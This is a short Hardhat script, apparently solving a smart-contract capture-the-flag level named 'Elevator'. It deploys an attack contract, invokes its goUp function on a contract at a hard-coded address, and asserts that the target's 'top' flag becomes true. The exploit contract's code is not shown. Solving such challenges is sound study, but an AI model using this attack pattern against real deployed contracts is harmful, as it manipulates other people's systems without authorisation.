import { expect } from "chai";
import { ethers } from "hardhat";
import { Elevator, Elevator2, Elevator2__factory, Elevator__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0xDE368D853802311F94e2F2f677aa563A5C11F15F';
  const elevatorInstance: Elevator = Elevator__factory.connect(deployedAddress, addr1);

  const attackInstance: Elevator2 = await new Elevator2__factory(addr1).deploy();
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  expect(await elevatorInstance.top()).to.be.equal(false);

  let tx = await attackInstance.goUp(elevatorInstance.address, { gasLimit: 200000 });
  await tx.wait(1);
  expect(await elevatorInstance.top()).to.be.equal(true);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
